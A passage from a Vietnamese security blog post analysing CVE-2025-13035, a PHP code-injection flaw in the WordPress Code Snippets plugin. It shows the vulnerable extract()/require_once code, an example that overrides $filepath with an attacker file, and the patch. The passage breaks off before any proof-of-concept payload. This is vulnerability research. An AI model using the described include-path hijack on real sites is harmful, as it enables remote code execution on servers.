<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="vi">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>CVE-2025-13035 Analysis &amp; POC - Bui Van Y</title><meta name="author" content="Bui Van Y">
<meta name="description" content="Security Vulnerability in WordPress Code Snippets Plugin."><meta name="keywords" content='analyst, plugin, remote code execution'>
  <meta itemprop="name" content="CVE-2025-13035 Analysis & POC">
  <meta itemprop="description" content="Security Vulnerability in WordPress Code Snippets Plugin.">
  <meta itemprop="datePublished" content="2025-11-27T19:00:00+07:00">
  <meta itemprop="dateModified" content="2025-12-03T12:25:23+07:00">
  <meta itemprop="wordCount" content="2473">
  <meta itemprop="image" content="http://localhost:1313/posts/2025-11-27-cve-2025-13035/app.png">
  <meta itemprop="keywords" content="Analyst,Plugin,Remote Code Execution"><meta property="og:url" content="http://localhost:1313/vi/posts/2025-11-27-cve-2025-13035/">
  <meta property="og:site_name" content="Bui Van Y">
  <meta property="og:title" content="CVE-2025-13035 Analysis & POC">
  <meta property="og:description" content="Security Vulnerability in WordPress Code Snippets Plugin.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-11-27T19:00:00+07:00">
    <meta property="article:modified_time" content="2025-12-03T12:25:23+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Remote Code Execution">
    <meta property="og:image" content="http://localhost:1313/posts/2025-11-27-cve-2025-13035/app.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/2025-11-27-cve-2025-13035/app.png">
  <meta name="twitter:title" content="CVE-2025-13035 Analysis & POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress Code Snippets Plugin.">
<meta name="application-name" content="Bui Van Y">
<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/vi/posts/2025-11-27-cve-2025-13035/" title="CVE-2025-13035 Analysis &amp; POC - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/vi/posts/2025-11-26-cve-2025-26763/" title="CVE-2025-26763 Analysis &amp; POC" /><link rel="next" type="text/html" href="http://localhost:1313/vi/posts/2025-11-28-cve-2025-9321/" title="CVE-2025-9321 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/vi/posts/2025-11-27-cve-2025-13035/index.md" title="CVE-2025-13035 Analysis & POC - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "CVE-2025-13035 Analysis \u0026 POC",
    "inLanguage": "vi",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/vi\/posts\/2025-11-27-cve-2025-13035\/"
    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, plugin, remote code execution","wordcount":  2473 ,
    "url": "http:\/\/localhost:1313\/vi\/posts\/2025-11-27-cve-2025-13035\/","datePublished": "2025-11-27T19:00:00+07:00","dateModified": "2025-12-03T12:25:23+07:00","publisher": {
      "@type": "Organization",
      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
        "@type": "Person",
        "name": "Bui Van Y"
      },"description": "Security Vulnerability in WordPress Code Snippets Plugin."
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" role="button" aria-label="Đổi chủ đề" title="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></li><li class="menu-item language-switch">
            <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
            <ul class="sub-menu"><li class="menu-item"><a href="/posts/2025-11-27-cve-2025-13035/" class="menu-link" title="English">English</a></li><li class="menu-item"><span class="text-secondary" title="Vietnamese">Vietnamese</span></li></ul>
          </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
      <div class="theme-switch" role="button" aria-label="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></div>
      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Huỷ
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system"><span class="menu-system-item language-switch">
              <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ">Vietnamese<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
              <select id="language-select" class="language-select" onchange="location = this.value;"><option value="/posts/2025-11-27-cve-2025-13035/">English</option><option value="/vi/posts/2025-11-27-cve-2025-13035/" selected disabled>Vietnamese</option></select>
            </span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
      <div class="details-summary related-summary">
        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
        <span class="related-title">Nội dung liên quan</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
      <div class="details-content related-content">
        <ul class="related-list"><li class="related-item">
              <a href="/vi/posts/2025-12-06-cve-2024-11600/" title="CVE-2024-11600 Analysis &amp; POC">CVE-2024-11600 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-12-05-cve-2025-48140/" title="CVE-2024-8672 Analysis &amp; POC">CVE-2024-8672 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-12-04-cve-2024-8672/" title="CVE-2024-8672 Analysis &amp; POC">CVE-2024-8672 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-12-03-cve-2025-30911/" title="CVE-2025-30911 Analysis &amp; POC">CVE-2025-30911 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-12-02-cve-2025-52756/" title="CVE-2025-52756 Analysis &amp; POC">CVE-2025-52756 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-12-01-cve-2025-3053/" title="CVE-2025-3053 Analysis &amp; POC">CVE-2025-3053 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-30-cve-2025-32222/" title="CVE-2025-32222 Analysis &amp; POC">CVE-2025-32222 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-28-cve-2025-9321/" title="CVE-2025-9321 Analysis &amp; POC">CVE-2025-9321 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-22-cve-2025-9501/" title="CVE-2025-9501 Analysis &amp; POC">CVE-2025-9501 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-26-cve-2025-26763/" title="CVE-2025-26763 Analysis &amp; POC">CVE-2025-26763 Analysis &amp; POC</a></li></ul>
      </div>
    </div></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>CVE-2025-13035 Analysis &amp; POC</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Tác giả" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;trong <a href="/vi/categories/cve-analysis/" class="post-category" title="Danh mục - CVE Analysis"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analysis</a></span></div><div class="post-meta-line"><span title="đăng ngày 2025-11-27 19:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-11-27">2025-11-27</time></span>&nbsp;<span title="Cập nhật ngày 2025-12-03 12:25:23"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-12-03">2025-12-03</time></span>&nbsp;<span title="2473 từ"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>Khoảng 2500 từ</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>12 phút</span>&nbsp;</div>
    </div><div class="featured-image"><img src='/posts/2025-11-27-cve-2025-13035/app.png' alt="/posts/2025-11-27-cve-2025-13035/app.png"></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Nội dung</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#cause">Cause</a></li>
    <li><a href="#analysis">Analysis</a></li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#key-takeaways">Key Takeaways</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 class="heading-element" id="cve--basic-info"><span>CVE &amp; Basic Info</span>
  <a href="#cve--basic-info" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Plugin Code Snippets cho WordPress tồn tại lỗ hổng PHP Code Injection trong tất cả các phiên bản cho đến, và bao gồm, 3.9.1. Nguyên nhân là do plugin sử dụng <code>extract()</code> trên shortcode attributes do attacker kiểm soát bên trong method <code>evaluate_shortcode_from_flat_file</code>, có thể được dùng để ghi đè biến <code>$filepath</code> và sau đó truyền vào require_once. Điều này cho phép attacker đã xác thực, với quyền Contributor trở lên, thực thi tùy ý PHP code trên server thông qua shortcode <code>[code_snippet]</code> bằng cách sử dụng PHP filter chains nếu họ có thể lừa administrator bật tùy chọn &ldquo;Enable file-based execution&rdquo; và tạo ít nhất một Content snippet đang hoạt động.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-13035"target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-13035</a></li>
<li><strong>Vulnerability Type</strong>: Remote Code Execution</li>
<li><strong>Affected Versions</strong>: &lt;= 3.9.1</li>
<li><strong>Patched Versions</strong>: 3.9.2</li>
<li><strong>CVSS severity</strong>: Medium (8.5)</li>
<li><strong>Required Privilege</strong>: Contributor</li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/code-snippets/"target="_blank" rel="external nofollow noopener noreferrer">WordPress Code Snippets Plugin</a></li>
</ul>
<h2 class="heading-element" id="requirements"><span>Requirements</span>
  <a href="#requirements" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><strong>Local WordPress &amp; Debugging</strong>
<ul>
<li><a href="https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/"target="_blank" rel="external nofollow noopener noreferrer">Virtual Machine</a></li>
<li><a href="https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/"target="_blank" rel="external nofollow noopener noreferrer">Docker</a></li>
</ul>
</li>
<li><strong>Plugin Version</strong> - <strong>Code Snippets</strong>:
<ul>
<li><code>3.9.1</code> – <strong>vulnerable</strong></li>
<li><code>3.9.2</code> – <strong>patched</strong></li>
</ul>
</li>
<li><strong>Diff Tool (diff)</strong> → <a href="https://meldmerge.org/"target="_blank" rel="external nofollow noopener noreferrer"><strong>Meld</strong></a> hoặc bất kỳ công cụ diff nào.</li>
</ul>
<h2 class="heading-element" id="cause"><span>Cause</span>
  <a href="#cause" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><strong>Trong phiên bản lỗi (v3.9.1):</strong></p>
<div class="highlight" title="class-front-end.php v3.9.1" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="hl"><span class="lnt">11
</span></span><span class="hl"><span class="lnt">12
</span></span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">private</span> <span class="k">function</span> <span class="nf">evaluate_shortcode_from_flat_file</span><span class="p">(</span> <span class="nv">$filepath</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$atts</span> <span class="p">)</span><span class="o">:</span> <span class="nx">string</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">ob_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">(</span> <span class="k">function</span><span class="p">(</span> <span class="nv">$atts</span> <span class="p">)</span> <span class="k">use</span> <span class="p">(</span> <span class="nv">$filepath</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd">            * Avoiding extract is typically recommended, however in this situation we want to make it easy for snippet
</span></span></span><span class="line"><span class="cl"><span class="sd">            * authors to use custom attributes.
</span></span></span><span class="line"><span class="cl"><span class="sd">            *
</span></span></span><span class="line"><span class="cl"><span class="sd">            * @phpcs:disable WordPress.PHP.DontExtract.extract_extract
</span></span></span><span class="line"><span class="cl"><span class="sd">            */</span>
</span></span><span class="line hl"><span class="cl">        <span class="nx">extract</span><span class="p">(</span> <span class="nv">$atts</span> <span class="p">);</span>
</span></span><span class="line hl"><span class="cl">        <span class="k">require_once</span> <span class="nv">$filepath</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="p">)(</span> <span class="nv">$atts</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">ob_get_clean</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Trong hàm <code>evaluate_shortcode_from_flat_file</code>, một <strong>anonymous function</strong> được định nghĩa và gọi ngay lập tức (IIFE). Hàm này nhận tham số <code>$atts</code> (mảng các attribute của shortcode) và sử dụng thêm biến <code>$filepath</code> từ bên ngoài thông qua <code>use ($filepath)</code>.</p>
<p>Lệnh <code>extract($atts)</code> sẽ trích xuất các phần tử trong mảng <code>$atts</code> thành biến riêng lẻ trong symbol table của scope hiện tại.</p>
<p>Ví dụ:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$atts</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;color&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;blue&#39;</span><span class="p">,</span> <span class="s1">&#39;size&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;large&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$atts</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Bây giờ có $color = &#39;blue&#39;, $size = &#39;large&#39;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Về mặt nội bộ, PHP quản lý biến thông qua <strong>zval container</strong>:</p>
<div class="details admonition quote open disabled">
  <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-quote-right" aria-hidden="true"></i>Trích dẫn</div>
  <div class="details-content">
    <div class="admonition-content"><p>A PHP variable is stored in a container called a &ldquo;zval&rdquo;. A zval container contains, besides the variable&rsquo;s type and value, two additional bits of information. The first is called &ldquo;is_ref&rdquo; and is a boolean value indicating whether or not the variable is part of a &ldquo;reference set&rdquo;. With this bit, PHP&rsquo;s engine knows how to differentiate between normal variables and references. Since PHP allows user-land references, as created by the &amp; operator, a zval container also has an internal reference counting mechanism to optimize memory usage. This second piece of additional information, called &ldquo;refcount&rdquo;, contains how many variable names (also called symbols) point to this one zval container. All symbols are stored in a symbol table, of which there is one per scope. There is a scope for the main script (i.e., the one requested through the browser), as well as one for every function or method.</p></div>
  </div>
</div><p>Khi <code>extract()</code> chạy:</p>
<ul>
<li>Mỗi phần tử trong <code>$atts</code> được ánh xạ thành một biến mới.</li>
<li>Các biến này trỏ đến cùng một <strong>zval</strong> với giá trị trong mảng.</li>
<li>Điều này làm tăng <strong>refcount</strong> (số lượng tên biến cùng tham chiếu đến một giá trị).</li>
<li>Khi scope kết thúc, symbol table bị hủy, refcount giảm xuống và bộ nhớ được giải phóng.</li>
</ul>
<div class="details admonition bug open disabled">
  <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-bug" aria-hidden="true"></i>Lỗi</div>
  <div class="details-content">
    <div class="admonition-content"><p><strong>Xung đột tên biến:</strong>
Nếu <code>$atts</code> chứa key trùng với biến đã tồn tại trong scope (ví dụ <code>&quot;filepath&quot;</code>), thì biến đó sẽ bị ghi đè.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$atts</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;filepath&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;/tmp/malicious.php&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$atts</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="nv">$filepath</span><span class="p">;</span> <span class="c1">// giờ sẽ nạp file từ $atts, không phải file gốc
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Đây chính là nguyên nhân gây ra lỗ hổng: attacker có thể chèn giá trị <code>&quot;filepath&quot;</code> để điều khiển file được <code>require_once</code>.</p></div>
  </div>
</div><p><strong>Bản vá (v3.9.2):</strong></p>
<p><figure><a class="lightgallery" href="/posts/2025-11-27-cve-2025-13035/diff.png" title="Sự thay đổi của bản vá" data-thumbnail="/posts/2025-11-27-cve-2025-13035/diff.png" data-sub-html="<h2>Diff</h2><p>Sự thay đổi của bản vá</p>"><img loading="lazy" src='/posts/2025-11-27-cve-2025-13035/diff.png' alt="Diff" height="325" width="1826"></a><figcaption class="image-caption">Sự thay đổi của bản vá</figcaption>
  </figure></p>
<p>Trong bản vá, hàm <code>extract()</code> đã được bổ sung option <code>EXTR_SKIP</code>.</p>
<ul>
<li>Tùy chọn này đảm bảo rằng nếu <code>$atts</code> có key trùng với biến đã tồn tại, biến gốc sẽ không bị ghi đè.</li>
<li>Nhờ đó, <code>$filepath</code> được truyền từ bên ngoài vẫn giữ nguyên giá trị an toàn, loại bỏ nguy cơ bị thay thế bởi dữ liệu từ <code>$atts</code>.</li>
</ul>
<h2 class="heading-element" id="analysis"><span>Analysis</span>
  <a href="#analysis" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Plugin đã đăng ký một shortcode:</p>
<div class="highlight" title="class-front-end.php v3.9.1" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="hl"><span class="lnt">2
</span></span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">const</span> <span class="no">CONTENT_SHORTCODE</span> <span class="o">=</span> <span class="s1">&#39;code_snippet&#39;</span><span class="p">;</span>
</span></span><span class="line hl"><span class="cl"><span class="nx">add_shortcode</span><span class="p">(</span> <span class="nx">self</span><span class="o">::</span><span class="na">CONTENT_SHORTCODE</span><span class="p">,</span> <span class="p">[</span> <span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;render_content_shortcode&#39;</span> <span class="p">]</span> <span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Khi shortcode này xuất hiện trong nội dung của post/page, WordPress sẽ gọi callback <code>render_content_shortcode</code>:</p>
<div class="highlight" title="class-front-end.php v3.9.1" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="hl"><span class="lnt"> 3
</span></span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="hl"><span class="lnt">24
</span></span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="hl"><span class="lnt">31
</span></span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">render_content_shortcode</span><span class="p">(</span> <span class="k">array</span> <span class="nv">$atts</span> <span class="p">)</span><span class="o">:</span> <span class="nx">string</span> <span class="p">{</span>
